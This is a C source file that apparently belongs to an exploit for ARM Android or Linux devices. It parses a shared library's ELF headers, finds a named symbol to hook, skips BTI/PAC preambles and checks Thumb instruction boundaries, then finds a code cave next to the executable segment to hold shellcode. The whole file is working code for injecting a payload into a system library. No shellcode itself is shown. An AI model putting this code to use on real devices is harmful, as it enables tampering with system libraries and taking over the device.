#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/elf.h>
#include <stdio.h>

#ifdef __aarch64__
typedef Elf64_Ehdr ElfN_Ehdr;
typedef Elf64_Phdr ElfN_Phdr;
typedef Elf64_Shdr ElfN_Shdr;
typedef Elf64_Sym  ElfN_Sym;
#else
typedef Elf32_Ehdr ElfN_Ehdr;
typedef Elf32_Phdr ElfN_Phdr;
typedef Elf32_Shdr ElfN_Shdr;
typedef Elf32_Sym  ElfN_Sym;
#endif

static int find_code_cave(int fd, uint64_t exec_off, uint64_t exec_filesz,
                           uint64_t tail_off, size_t shellcode_size,
                           uint64_t *out_off,
                           uint64_t next_seg_off) {
    long pagesize = sysconf(_SC_PAGESIZE);
    uint64_t gap = 0;
    uint64_t page_off, page_slack, usable;

    if (next_seg_off > tail_off)
        gap = next_seg_off - tail_off;

    page_off = tail_off & ((uint64_t)pagesize - 1);
    page_slack = page_off ? (uint64_t)pagesize - page_off : 0;
    usable = gap ? (gap < page_slack ? gap : page_slack) : page_slack;

    if (shellcode_size <= usable) {
        *out_off = tail_off;
        return 0;
    }

    printf("no safe cave: tail slack %llu, gap to next segment %llu, need %zu - DEVICE NOT SUPPORTED\n",
           (unsigned long long)page_slack, (unsigned long long)gap, shellcode_size);
    return 1;
}

int find_hook_target(const char *libcxx, const char *symname,
                     uint64_t *hook_target, uint64_t *payload_target,
                     uint32_t *first_instruction, size_t shellcode_size) {
    *hook_target = 0;
    *payload_target = 0;

    int fd = open(libcxx, O_RDONLY);
    if (fd < 0) {
        printf("open %s failed: %s\n", libcxx, strerror(errno));
        return 1;
    }

    ElfN_Ehdr hdr;
    if (read(fd, (char *)&hdr, sizeof(hdr)) < (ssize_t)sizeof(hdr)) {
        printf("read ELF header from %s failed: %s\n", libcxx, strerror(errno));
        close(fd); return 1;
    }
    if (strncmp((char *)hdr.e_ident, "\x7f""ELF", 4) != 0) {
        printf("invalid ELF: %s\n", libcxx);
        close(fd); return 1;
    }
    if (lseek64(fd, hdr.e_phoff, SEEK_SET) < 0) {
        printf("lseek64 e_phoff failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (hdr.e_phentsize != sizeof(ElfN_Phdr)) {
        printf("invalid phentsize: %d\n", hdr.e_phentsize);
        close(fd); return 1;
    }

    uint64_t executable_off = 0, executable_filesz = 0;
    uint64_t executable_vaddr = 0;
    uint64_t next_seg_off = 0;
    int found_exec = 0;
    for (int i = 0; i < hdr.e_phnum; i++) {
        ElfN_Phdr phdr;
        if (read(fd, (char *)&phdr, sizeof(phdr)) < 0) {
            printf("read phdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (!found_exec && phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X)) {
            *payload_target   = phdr.p_offset + phdr.p_filesz;
            executable_off    = phdr.p_offset;
            executable_filesz = phdr.p_filesz;
            executable_vaddr  = phdr.p_vaddr;
            found_exec = 1;
        } else if (found_exec && phdr.p_type == PT_LOAD && !next_seg_off) {
            next_seg_off = phdr.p_offset;
        }
    }

    if (!found_exec) {
        printf("no executable PT_LOAD segment found in %s\n", libcxx);
        close(fd); return 1;
    }

    if (lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(ElfN_Shdr), SEEK_SET) < 0) {
        printf("lseek64 shstrndx failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    ElfN_Shdr str_shdr;
    if (read(fd, (char *)&str_shdr, sizeof(str_shdr)) < 0) {
        printf("read shstrndx failed: %s\n", strerror(errno));
        close(fd); return 1;
    }

    uint64_t dynstr = 0, dynsym_offset = 0, dynsym_size = 0;
    for (int i = 0; i < hdr.e_shnum; i++) {
        ElfN_Shdr shdr;
        if (lseek64(fd, hdr.e_shoff + i * sizeof(ElfN_Shdr), SEEK_SET) < 0) {
            printf("lseek64 shdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (read(fd, (char *)&shdr, sizeof(shdr)) < 0) {
            printf("read shdr[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (lseek64(fd, shdr.sh_name + str_shdr.sh_offset, SEEK_SET) < 0) {
            printf("lseek64 sh_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        char name[100];
        if (read(fd, name, sizeof(name) - 1) < 0) {
            printf("read sh_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        name[sizeof(name) - 1] = 0;
        if (strcmp(name, ".dynstr") == 0) dynstr = shdr.sh_offset;
        if (strcmp(name, ".dynsym") == 0) { dynsym_offset = shdr.sh_offset; dynsym_size = shdr.sh_size; }
    }

    if (dynstr == 0 || dynsym_offset == 0) {
        printf(".dynstr or .dynsym not found in %s\n", libcxx);
        close(fd); return 1;
    }

    for (int i = 0; i < (int)(dynsym_size / sizeof(ElfN_Sym)); i++) {
        ElfN_Sym sym;
        if (lseek64(fd, dynsym_offset + i * sizeof(ElfN_Sym), SEEK_SET) < 0) {
            printf("lseek64 dynsym[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (read(fd, (char *)&sym, sizeof(sym)) < 0) {
            printf("read dynsym[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        if (lseek64(fd, dynstr + sym.st_name, SEEK_SET) < 0) {
            printf("lseek64 st_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        char name[200];
        if (read(fd, name, sizeof(name) - 1) < 0) {
            printf("read st_name[%d] failed: %s\n", i, strerror(errno));
            close(fd); return 1;
        }
        name[sizeof(name) - 1] = 0;
        if (strcmp(name, symname) == 0) {
            uint64_t val = sym.st_value;
#ifndef __aarch64__
            val &= ~(uint64_t)1;
#endif
            *hook_target = val - executable_vaddr + executable_off;
            break;
        }
    }

    if (*hook_target == 0) {
        printf("symbol %s not found in %s\n", symname, libcxx);
        close(fd); return 1;
    }

    if (lseek64(fd, *hook_target, SEEK_SET) < 0) {
        printf("lseek64 hook_target failed: %s\n", strerror(errno));
        close(fd); return 1;
    }
    if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
        printf("read first instruction failed: %s\n", strerror(errno));
        close(fd); return 1;
    }

#ifdef __aarch64__
    for (int adv = 0; adv < 2; adv++) {
        switch (*first_instruction) {
        case 0xd503233f: /* PACIASP  */
        case 0xd503237f: /* PACIBSP  */
        case 0xd503241f: /* BTI      */
        case 0xd503245f: /* BTI c    */
        case 0xd503249f: /* BTI j    */
        case 0xd50324df: /* BTI jc   */
            printf("BTI/PAC preamble at hook site, advancing +4\n");
            *hook_target += 4UL;
            if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
                printf("read preamble +%d failed: %s\n", (adv + 1) * 4, strerror(errno));
                close(fd); return 1;
            }
            continue;
        default:
            break;
        }
        break;
    }
#else
    {
        uint16_t first_hw = (uint16_t)(*first_instruction & 0xffff);
        if ((first_hw >> 11) < 0x1d) {
            uint16_t second_hw = (uint16_t)((*first_instruction >> 16) & 0xffff);
            if ((second_hw >> 11) >= 0x1d) {
                printf("16-bit first instruction followed by start of 32-bit - would split it\n");
                close(fd); return 1;
            }
        }
    }
#endif

    if (find_code_cave(fd, executable_off, executable_filesz,
                       *payload_target, shellcode_size, payload_target,
                       next_seg_off)) {
        close(fd); return 1;
    }

    close(fd);
    return 0;
}
